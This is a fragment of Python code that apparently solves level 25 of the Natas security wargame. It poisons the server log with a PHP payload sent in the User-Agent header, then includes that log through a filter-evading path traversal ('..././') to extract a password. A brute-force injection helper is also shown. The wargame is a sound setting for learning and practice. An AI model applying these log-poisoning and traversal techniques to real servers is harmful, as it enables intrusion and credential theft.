...
def brute_force(website: str, post_mode: bool, key: str, query: str, username: str, password: str, check_func: typing.Callable, match: bool, match_query: str = None) -> list:
    ...
    if match:
        ...
        for c in tqdm(char_set):            
            inject_response, inject_soup = send_post_request(website=website, data={key: match_query.format(data=c)}, username=username, password=password, verbose=False)
...
with open("./natas/code/natas25-inject.php", "r") as f:
    headers["User-Agent"] = f.read()

test_response, test_soup = send_get_request(website=website, params=data, headers=headers, username=username, password=password, get_body=False)

php_id = test_response.cookies["PHPSESSID"]
log_file = f"/var/www/natas/natas25/logs/natas25_{php_id}.log"

cookies = {"PHPSESSID": php_id}
data = {"lang": f"..././..././..././..././..././{log_file}"}

final_response, final_soup = send_get_request(website=website, params=data, cookies=cookies, username=username, password=password, get_body=False)

content = final_soup.get_text("\n")

content = content.splitlines()

content = [c for c in content if "[" in c][0]
